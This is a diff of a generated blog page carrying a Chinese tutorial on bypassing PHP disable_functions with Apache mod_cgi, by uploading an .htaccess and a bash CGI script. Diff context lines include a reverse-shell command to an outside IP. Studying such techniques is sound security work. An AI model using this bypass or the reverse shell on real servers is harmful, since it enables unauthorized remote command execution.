@@ -668,6 +668,10 @@ CGI编程没有特定的语言,C语言,python,li">
                                 <span class="chip bg-color">Linux</span>
                             </a>
                         
+                            <a href="/tags/bypass-disable-functions/" target="_blank">
+                                <span class="chip bg-color">bypass disable functions</span>
+                            </a>
+                        
                     </div>
                     
                 </div>
@@ -702,7 +706,7 @@ CGI编程没有特定的语言,C语言,python,li">
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        1k
+                        1.1k
                     </div>
                     
 
@@ -724,7 +728,7 @@ CGI编程没有特定的语言,C语言,python,li">
                 <h1 id="利用Apache-mod-cgi进行bypass-disabled-function"><a href="#利用Apache-mod-cgi进行bypass-disabled-function" class="headerlink" title="利用Apache mod_cgi进行bypass disabled_function"></a>利用Apache mod_cgi进行bypass disabled_function</h1><h3 id="CGI"><a href="#CGI" class="headerlink" title="CGI"></a>CGI</h3><p>公共网关接口，就是web服务器可以加载的外部程序规范，CGI脚本即使用遵从该规范编写的外部程序。</p>
 <p>CGI编程没有特定的语言,C语言,python,linux shell,perl,vb等等都可以进行CGI编程.</p>
 <p><strong>使用linux shell脚本编写的cgi程序便可以执行系统命令</strong>.</p>
-<p>MOD_CGI<br>任何具有MIME类型application/x-httpd-cgi或者被cgi-script处理器处理的文件都将被作为CGI脚本对待并由服务器运行，它的输出将被返回给客户端。可以通过两种途径使文件成为CGI脚本，一种是文件具有已由AddType指令定义的扩展名，另一种是文件位于ScriptAlias目录中.</p>
+<p>MOD_CGI<br>任何具有MIME类型application/x-httpd-cgi或者被cgi-script处理器处理的文件都将被作为CGI脚本对待并由服务器运行，它的输出将被返回给客户端。可以通过三种途径使文件成为CGI脚本，一种是文件具有已由AddType指令定义的扩展名，一种是文件位于ScriptAlias目录中，最后一种是在目录放入<code>.htaccess</code>文件，规定将某个后缀的文件按cgi脚本解析。</p>
 <p>apache在配置cgi后可以用ScriptAlias指令指定一个目录,指定的目录下面便存放可执行的cgi程序.若是想要增加文件夹也可执行cgi程序,则可在apache主配置文件中做如下设置</p>
 <pre class="line-numbers language-ini"><code class="language-ini">&lt;Directory PATH>
 
@@ -734,7 +738,7 @@ Options +ExecCGI
 <p>例如</p>
 <pre class="line-numbers language-ini"><code class="language-ini">&lt;Directory /var/www/html/>
 
-Options +ExecCGI                      #这便是允许cgi程序执行，在“/var/www/html/”这个路径下
+Options +ExecCGI                      #这便是在“/var/www/html/”这个路径下允许cgi程序执行
 
 &lt;/Directory><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>当然,若是想临时允许一个目录可以执行cgi程序并且使得服务器将自定义的后缀解析为cgi程序,则可以在目的目录下使用htaccess文件进行配置,如下:</p>
@@ -744,9 +748,10 @@ Options +ExecCGI                      #这便是允许cgi程序执行，在“/v
 AddHandler cgi-script .cnm
 </code></pre><h2 id="攻击原理和方式"><a href="#攻击原理和方式" class="headerlink" title="攻击原理和方式"></a>攻击原理和方式</h2><p><strong>步骤：</strong></p>
 <p>1.在Apache允许允许使用<code>.htaccess</code> 的目录 放入<code>.htaccess</code>文件，用于把你上传的某个文件解析成cgi脚本。如果Apache本来就允许某个目录执行cgi脚本，则可以省略这一步骤。</p>
-<pre><code>Options +ExecCGI
+<pre class="line-numbers language-ini"><code class="language-ini">Options +ExecCGI
 
-AddHandler cgi-script .cnm        //把.cnm后缀的文件按cgi脚本解析</code></pre><p>2.上传你的cgi脚本</p>
+AddHandler cgi-script .cnm        //把.cnm后缀的文件按cgi脚本解析<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>2.上传你的cgi脚本</p>
 <p>例如</p>
 <pre class="line-numbers language-shell"><code class="language-shell">#!/bin/bash
 echo -ne "Content-Type: text/html\n\n"          //如果要进行反弹shell才需要这条命令，否则会500
@@ -888,30 +893,29 @@ bash -i >& /dev/tcp/121.4.101.246/9999 0>&1        //反弹shell或者任意www-
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fa fa-dot-circle-o"></i>&nbsp;本篇
-            </div>
+                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2021/03/06/2021-3-6-apache-cgi-mod/">
+                <a href="/2021/03/07/2021-3-7-chu-shi-web-socket/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="利用Apache mod_cgi进行bypass disabled_function攻击">
+                        <img src="/medias/banner/8.jpg" class="responsive-img" alt="初识web socket">
                         
-                        <span class="card-title">利用Apache mod_cgi进行bypass disabled_function攻击</span>
+                        <span class="card-title">初识web socket</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            利用Apache_cgi_mod进行bypass disabled_function攻击的简单原理解析和使用
+                            简单理解socketsocket我们知道两个进程如果需要进行通讯最基本的一个前提能能够唯一的标示一个进程，在本地进程通讯中我们可以使用PID来唯一标示一个进程，但PID只在本地唯一，网络中的两个进程PID冲突几率很大，这时候我们需要另辟它径
                         
                     </div>
                     <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2021-03-06
-                            </span>
+                        <span class="publish-date">
+                            <i class="fa fa-clock-o fa-fw icon-date"></i>2021-03-07
+                        </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
@@ -924,20 +928,15 @@ bash -i >& /dev/tcp/121.4.101.246/9999 0>&1        //反弹shell或者任意www-
                         </span>
                     </div>
                 </div>
-
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/漏洞/" target="_blank">
-                        <span class="chip bg-color">漏洞</span>
+                    <a href="/tags/web/" target="_blank">
+                        <span class="chip bg-color">web</span>
                     </a>
                     
-                    <a href="/tags/PHP/" target="_blank">
-                        <span class="chip bg-color">PHP</span>
-                    </a>
-                    
-                    <a href="/tags/Linux/" target="_blank">
-                        <span class="chip bg-color">Linux</span>
+                    <a href="/tags/socket/" target="_blank">
+                        <span class="chip bg-color">socket</span>
                     </a>
                     
                 </div>
@@ -995,6 +994,10 @@ bash -i >& /dev/tcp/121.4.101.246/9999 0>&1        //反弹shell或者任意www-
                     
                     <a href="/tags/Linux/" target="_blank">
                         <span class="chip bg-color">Linux</span>
+                    </a>
+                    
+                    <a href="/tags/bypass-disable-functions/" target="_blank">
+                        <span class="chip bg-color">bypass disable functions</span>
                     </a>
                     
                 </div>
@@ -1158,7 +1161,7 @@ bash -i >& /dev/tcp/121.4.101.246/9999 0>&1        //反弹shell或者任意www-
 
             
                 &nbsp; | &nbsp;字数统计:&nbsp;
-                <span class="white-color">89.9k</span> 字
+                <span class="white-color">92.3k</span> 字
             
 
             
